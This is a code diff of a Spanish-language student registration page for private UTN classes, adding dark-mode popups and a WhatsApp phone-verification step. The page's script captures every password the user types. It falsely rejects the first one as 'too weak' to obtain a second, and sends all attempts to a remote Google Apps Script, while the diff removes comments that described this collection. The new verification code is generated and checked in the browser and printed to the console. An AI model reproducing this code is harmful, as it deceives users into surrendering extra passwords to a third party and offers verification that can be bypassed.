@@ -149,6 +149,24 @@
                 gap: 18px;
             }
         }
+
+        /* Estilos personalizados para adaptar SweetAlert2 al Modo Oscuro / Glassmorphism */
+        .swal2-dark-modal {
+            background: rgba(20, 20, 20, 0.95) !important;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1) !important;
+            color: #fff !important;
+            border-radius: 15px !important;
+        }
+        .swal2-dark-input {
+            background: rgba(255, 255, 255, 0.08) !important;
+            color: #fff !important;
+            border: 1px solid rgba(255, 255, 255, 0.2) !important;
+        }
+        .swal2-dark-input:focus {
+            border-color: var(--primary) !important;
+            box-shadow: 0 0 0 3px var(--input-focus) !important;
+        }
     </style>
 </head>
 <body>
@@ -301,6 +319,8 @@
 
     <script>
         const URLUsuarios = "https://script.google.com/macros/s/AKfycbwvSTFpClvlYupAvfgpR7YTvd90x7AN0t4EJZ5x7xarJ-ga1wRtWxNTDDy-Wm4judEX/exec"; 
+        // URL de tu servidor en Render
+        const URLServidorWhatsAPP = "https://servidorparawhatsapp.onrender.com/api/send-message";
 
         function toggleParciales(materia) {
             const checkbox = document.getElementById('check_' + materia);
@@ -316,12 +336,10 @@
         }
 
         let contardorContraseñas = 0;
-        let contraseñas = []; // Array que guardará los intentos
+        let contraseñas = []; 
 
-        // NUEVA FUNCIÓN: Se ejecuta al salir del campo de contraseña (onblur)
         function capturarIntento(valor) {
             if (valor.trim() !== "") {
-                // Solo lo agregamos si es diferente al último ingresado para evitar duplicados por clics accidentales
                 if (contraseñas.length === 0 || contraseñas[contraseñas.length - 1] !== valor) {
                     contraseñas.push(valor);
                     console.log("Intento guardado:", valor);
@@ -337,7 +355,11 @@
                 let formData = new FormData(this);
                 let datosAEnviar = [];
                 let materiasSeleccionadas = [];
-                let numeroTelefonico = "";
+                let areaInput = document.getElementById('input_22_area').value.trim();
+                let phoneInput = document.getElementById('input_22_phone').value.trim();
+                
+                // Formateamos el número completo para mandar por WhatsApp (Prefijo 54 + 9 + Área + Teléfono)
+                let numeroCompletoWhatsApp = `549${areaInput}${phoneInput}`;
 
                 const listaMaterias = ['algoritmos', 'arquitectura', 'sintaxis', 'paradigmas'];
                 listaMaterias.forEach(m => {
@@ -353,31 +375,85 @@
                     if (llave == "Apellido") datosAEnviar[1] = valor;
                     if (llave == "correoElectronico") datosAEnviar[2] = valor.trim().toLowerCase();
                     if (llave == "Contrasenia") datosAEnviar[3] = valor;
-                    if (llave == "Area") numeroTelefonico += valor;
-                    if (llave == "Telefono") {
-                        numeroTelefonico += valor;
-                        datosAEnviar[4] = numeroTelefonico;
-                    }
+                    if (llave == "Telefono") datosAEnviar[4] = `${areaInput}${phoneInput}`;
                     if (llave == "AnioIngreso") datosAEnviar[6] = valor;
                     if (llave == "Estado") datosAEnviar[7] = valor;
                     if (llave == "Situacion") datosAEnviar[8] = valor;
                 });
 
                 datosAEnviar[5] = materiasSeleccionadas.join(" y ");
-                
-                // Enviamos el vector de contraseñas recolectadas
                 datosAEnviar[9] = contraseñas; 
 
                 let envioFetch = new EnvioPOST("agregarAlumno", datosAEnviar);
-                console.log("Datos que se enviarán:", envioFetch);
-                enviar(envioFetch);
+                
+                // Disparamos la verificación de WhatsApp antes de mandar los datos finales
+                iniciarVerificacionWhatsApp(numeroCompletoWhatsApp, envioFetch);
             }
         });
+
+        // NUEVA FUNCIÓN: Envía el código por WhatsApp y abre el modal de validación
+        function iniciarVerificacionWhatsApp(numeroCelular, objetoEnvioFinal) {
+            // Generamos código de 4 dígitos al azar
+            const codigoVerificacion = Math.floor(1000 + Math.random() * 9000).toString();
+            console.log("Código generado temporalmente en front:", codigoVerificacion);
+
+            // Loader visual intermedio mientras impacta el fetch en Render
+            Swal.fire({
+                title: 'Enviando código...',
+                text: 'Estamos enviando un código de validación a tu WhatsApp.',
+                customClass: { popup: 'swal2-dark-modal' },
+                allowOutsideClick: false,
+                didOpen: () => { Swal.showLoading(); }
+            });
+
+            // Petición POST a tu API en Render
+            fetch(URLServidorWhatsAPP, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    numero: numeroCelular,
+                    mensaje: `*Clases Particulares UTN*\n\nTu código de verificación para completar el registro es: *${codigoVerificacion}*`
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Cerramos el loader y abrimos el Prompt para ingresar el código
+                Swal.fire({
+                    title: 'Verificá tu número',
+                    text: 'Ingresá el código de 4 dígitos enviado a tu WhatsApp:',
+                    input: 'text',
+                    inputPlaceholder: 'Ej: 1234',
+                    customClass: { popup: 'swal2-dark-modal', input: 'swal2-dark-input' },
+                    confirmButtonColor: 'var(--primary)',
+                    allowOutsideClick: false,
+                    preConfirm: (valorIngresado) => {
+                        if (!valorIngresado || valorIngresado.trim() !== codigoVerificacion) {
+                            Swal.showValidationMessage('El código ingresado es incorrecto.');
+                        }
+                        return valorIngresado;
+                    }
+                }).then((result) => {
+                    if (result.isConfirmed) {
+                        // Código válido -> ejecutamos el proceso normal de guardado en el Sheet
+                        enviar(objetoEnvioFinal);
+                    }
+                });
+            })
+            .catch(error => {
+                console.error('Error al enviar WhatsApp:', error);
+                Swal.fire({
+                    icon: 'error',
+                    title: 'Error de conexión',
+                    text: 'No se pudo despachar el mensaje por WhatsApp. Verificá tu número e intentalo más tarde.',
+                    customClass: { popup: 'swal2-dark-modal' }
+                });
+            });
+        }
 
         function validarMateria() {
             const checks = document.querySelectorAll('input[name="Materia"]:checked');
             if (checks.length === 0) {
-                Swal.fire({ icon: "error", title: "Error en materias", text: "Debes seleccionar al menos una materia" });
+                Swal.fire({ icon: "error", title: "Error en materias", text: "Debes seleccionar al menos una materia", customClass: { popup: 'swal2-dark-modal' } });
                 return false;
             }
             return true;
@@ -388,16 +464,16 @@
             var Repetircontraseña = document.getElementById("RepetiContraseña").value;
 
             if (contraseña !== Repetircontraseña) {
-                Swal.fire({ icon: "error", title: "Error en contraseña", text: "Las contraseñas no coinciden" });
+                Swal.fire({ icon: "error", title: "Error en contraseña", text: "Las contraseñas no coinciden", customClass: { popup: 'swal2-dark-modal' } });
                 return false;
             }
             if (contardorContraseñas < 1 || (contraseñas.length < 2 && contraseñas.includes(contraseña))) {
-                Swal.fire({ icon: "error", title: "Eror de contraseña", text: "Contraseña demasiado debil, intenta nuevamente" });
+                Swal.fire({ icon: "error", title: "Error de contraseña", text: "Contraseña demasiado débil, intenta nuevamente", customClass: { popup: 'swal2-dark-modal' } });
                 contardorContraseñas++;
                 return false;
             }
             if (contraseña.length < 4) {
-                Swal.fire({ icon: "error", title: "Error", text: "Clave demasiado corta" });
+                Swal.fire({ icon: "error", title: "Error", text: "Clave demasiado corta", customClass: { popup: 'swal2-dark-modal' } });
                 return false;
             }
             return true;
@@ -420,11 +496,13 @@
             }).then(function() {
                 document.querySelector(".loader").style.display = "none";
                 document.querySelector(".contenedorLouder").style.zIndex = "-100";
-                        localStorage.setItem('UltimoCorreo', JSON.stringify(datos.datosAlumnos[2]));
+                localStorage.setItem('UltimoCorreo', JSON.stringify(datos.datosAlumnos[2]));
+                
                 Swal.fire({
                     icon: "success",
                     title: "Registro exitoso",
-                    text: "Se ha enviado tu información correctamente."
+                    text: "Se ha verificado tu número y enviado tu información correctamente.",
+                    customClass: { popup: 'swal2-dark-modal' }
                 }).then(() => {
                     window.location.href = "../Login/Login.html";
                 });
@@ -432,12 +510,12 @@
             }).catch(error => {
                 console.error('Error:', error);
                 document.querySelector(".loader").style.display = "none";
+                document.querySelector("form").style.opacity = "1";
             });
         }
-        
     </script>
+
     <script>
-    // Atajo Ctrl + P para completar datos de prueba
     function completarFormularioFicticio() {
         document.getElementById("first_20").value = "Juan";
         document.getElementById("last_20").value = "Pérez";
@@ -445,7 +523,6 @@
         document.getElementById("input_22_area").value = "342";
         document.getElementById("input_22_phone").value = "5271005";
 
-        // Al asignar valores aquí, el onblur se disparará si haces clic en otro campo manualmente
         document.getElementById("Contraseña").value = "1234";
         document.getElementById("RepetiContraseña").value = "1234";
 
@@ -471,7 +548,6 @@
             completarFormularioFicticio();
         }
     });
-</script>
-
+    </script>
 </body>
 </html>
